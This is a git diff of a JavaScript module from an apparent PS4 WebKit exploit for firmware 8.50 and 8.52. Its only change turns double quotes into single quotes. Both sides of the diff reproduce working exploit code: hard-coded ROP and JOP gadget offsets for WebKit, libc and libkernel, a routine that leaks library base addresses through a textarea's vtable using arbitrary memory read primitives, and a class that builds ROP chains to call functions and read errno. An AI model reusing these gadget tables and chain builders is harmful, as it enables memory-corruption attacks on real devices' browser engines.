@@ -17,14 +17,14 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
 // 8.50, 8.52
 
-import { mem } from "../../module/mem.mjs";
-import { KB } from "../../module/offset.mjs";
-import { ChainBase, get_gadget } from "../../module/chain.mjs";
-import { BufferView } from "../../module/rw.mjs";
+import { mem } from '../../module/mem.mjs';
+import { KB } from '../../module/offset.mjs';
+import { ChainBase, get_gadget } from '../../module/chain.mjs';
+import { BufferView } from '../../module/rw.mjs';
 
-import { get_view_vector, resolve_import, init_syscall_array } from "../../module/memtools.mjs";
+import { get_view_vector, resolve_import, init_syscall_array } from '../../module/memtools.mjs';
 
-import * as off from "../../module/offset.mjs";
+import * as off from '../../module/offset.mjs';
 
 // WebKit offsets of imported functions
 const offset_wk_stack_chk_fail = 0x8d8;
@@ -63,7 +63,7 @@ const jop4 = `
 push rdx
 jmp qword ptr [rax]
 `;
-const jop5 = "pop rsp; ret";
+const jop5 = 'pop rsp; ret';
 
 // the ps4 firmware is compiled to use rbp as a frame pointer
 //
@@ -80,33 +80,33 @@ const jop5 = "pop rsp; ret";
 
 const webkit_gadget_offsets = new Map(
   Object.entries({
-    "pop rax; ret": 0x000000000001ac7b, // `58 c3`
-    "pop rbx; ret": 0x000000000000c46d, // `5b c3`
-    "pop rcx; ret": 0x000000000001ac5f, // `59 c3`
-    "pop rdx; ret": 0x0000000000282ea2, // `5a c3`
+    'pop rax; ret': 0x000000000001ac7b, // `58 c3`
+    'pop rbx; ret': 0x000000000000c46d, // `5b c3`
+    'pop rcx; ret': 0x000000000001ac5f, // `59 c3`
+    'pop rdx; ret': 0x0000000000282ea2, // `5a c3`
 
-    "pop rbp; ret": 0x00000000000000b6, // `5d c3`
-    "pop rsi; ret": 0x0000000000050878, // `5e c3`
-    "pop rdi; ret": 0x0000000000091afa, // `5f c3`
-    "pop rsp; ret": 0x0000000000073c2b, // `5c c3`
+    'pop rbp; ret': 0x00000000000000b6, // `5d c3`
+    'pop rsi; ret': 0x0000000000050878, // `5e c3`
+    'pop rdi; ret': 0x0000000000091afa, // `5f c3`
+    'pop rsp; ret': 0x0000000000073c2b, // `5c c3`
 
-    "pop r8; ret": 0x000000000003b4b3, // `47 58 c3`
-    "pop r9; ret": 0x00000000010f372f, // `47 59 c3`
-    "pop r10; ret": 0x0000000000b1a721, // `47 5a c3`
-    "pop r11; ret": 0x0000000000eaba69, // `4f 5b c3`
+    'pop r8; ret': 0x000000000003b4b3, // `47 58 c3`
+    'pop r9; ret': 0x00000000010f372f, // `47 59 c3`
+    'pop r10; ret': 0x0000000000b1a721, // `47 5a c3`
+    'pop r11; ret': 0x0000000000eaba69, // `4f 5b c3`
 
-    "pop r12; ret": 0x0000000000eaf80d, // `47 5c c3`
-    "pop r13; ret": 0x00000000019a0d8b, // `41 5d c3`
-    "pop r14; ret": 0x0000000000050877, // `41 5e c3`
-    "pop r15; ret": 0x00000000007e2efd, // `47 5f c3`
+    'pop r12; ret': 0x0000000000eaf80d, // `47 5c c3`
+    'pop r13; ret': 0x00000000019a0d8b, // `41 5d c3`
+    'pop r14; ret': 0x0000000000050877, // `41 5e c3`
+    'pop r15; ret': 0x00000000007e2efd, // `47 5f c3`
 
-    "ret": 0x0000000000000032, // `c3`
-    "leave; ret": 0x000000000001ba53, // `c9 c3`
+    'ret': 0x0000000000000032, // `c3`
+    'leave; ret': 0x000000000001ba53, // `c9 c3`
 
-    "mov rax, qword ptr [rax]; ret": 0x000000000003734c, // `48 8b 00 c3`
-    "mov qword ptr [rdi], rax; ret": 0x000000000001433b, // `48 89 07 c3`
-    "mov dword ptr [rdi], eax; ret": 0x0000000000008e7f, // `89 07 c3`
-    "mov dword ptr [rax], esi; ret": 0x0000000000cf6c22, // `89 30 c3`
+    'mov rax, qword ptr [rax]; ret': 0x000000000003734c, // `48 8b 00 c3`
+    'mov qword ptr [rdi], rax; ret': 0x000000000001433b, // `48 89 07 c3`
+    'mov dword ptr [rdi], eax; ret': 0x0000000000008e7f, // `89 07 c3`
+    'mov dword ptr [rax], esi; ret': 0x0000000000cf6c22, // `89 30 c3`
 
     [jop1]: 0x00000000019881d0, // `48 8b 7e 08 48 8b 07 ff 60 70`
     [jop2]: 0x00000000011c9df0, // `55 48 89 e5 48 8b 07 ff 50 30`
@@ -118,22 +118,22 @@ const webkit_gadget_offsets = new Map(
 
 const libc_gadget_offsets = new Map(
   Object.entries({
-    "getcontext": 0x25904,
-    "setcontext": 0x29c38,
+    'getcontext': 0x25904,
+    'setcontext': 0x29c38,
   }),
 );
 
 const libkernel_gadget_offsets = new Map(
   Object.entries({
     // returns the location of errno
-    "__error": 0x10750,
+    '__error': 0x10750,
   }),
 );
 
 export const gadgets = new Map();
 
 function get_bases() {
-  const textarea = document.createElement("textarea");
+  const textarea = document.createElement('textarea');
   const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
   const textarea_vtable = webcore_textarea.readp(0);
   const off_ta_vt = 0x236d4a0;
@@ -160,30 +160,30 @@ export function init_gadget_map(gadget_map, offset_map, base_addr) {
 
 class Chain850Base extends ChainBase {
   push_end() {
-    this.push_gadget("leave; ret");
+    this.push_gadget('leave; ret');
   }
 
   push_get_retval() {
-    this.push_gadget("pop rdi; ret");
+    this.push_gadget('pop rdi; ret');
     this.push_value(this.retval_addr);
-    this.push_gadget("mov qword ptr [rdi], rax; ret");
+    this.push_gadget('mov qword ptr [rdi], rax; ret');
   }
 
   push_get_errno() {
-    this.push_gadget("pop rdi; ret");
+    this.push_gadget('pop rdi; ret');
     this.push_value(this.errno_addr);
 
-    this.push_call(this.get_gadget("__error"));
+    this.push_call(this.get_gadget('__error'));
 
-    this.push_gadget("mov rax, qword ptr [rax]; ret");
-    this.push_gadget("mov dword ptr [rdi], eax; ret");
+    this.push_gadget('mov rax, qword ptr [rax]; ret');
+    this.push_gadget('mov dword ptr [rdi], eax; ret');
   }
 
   push_clear_errno() {
-    this.push_call(this.get_gadget("__error"));
-    this.push_gadget("pop rsi; ret");
+    this.push_call(this.get_gadget('__error'));
+    this.push_gadget('pop rsi; ret');
     this.push_value(0);
-    this.push_gadget("mov dword ptr [rax], esi; ret");
+    this.push_gadget('mov dword ptr [rax], esi; ret');
   }
 }
 
@@ -214,7 +214,7 @@ export function init(Chain) {
   init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
   init_syscall_array(syscall_array, libkernel_base, 300 * KB);
 
-  let gs = Object.getOwnPropertyDescriptor(window, "location").set;
+  let gs = Object.getOwnPropertyDescriptor(window, 'location').set;
   // JSCustomGetterSetter.m_getterSetter
   gs = mem.addrof(gs).readp(0x28);
 
@@ -235,7 +235,7 @@ export function init(Chain) {
   // like DoubleShape. it will be used to store the JOP table's pointer
   const _rop = {
     get launch() {
-      throw Error("never call");
+      throw Error('never call');
     },
     0: 1.1,
   };
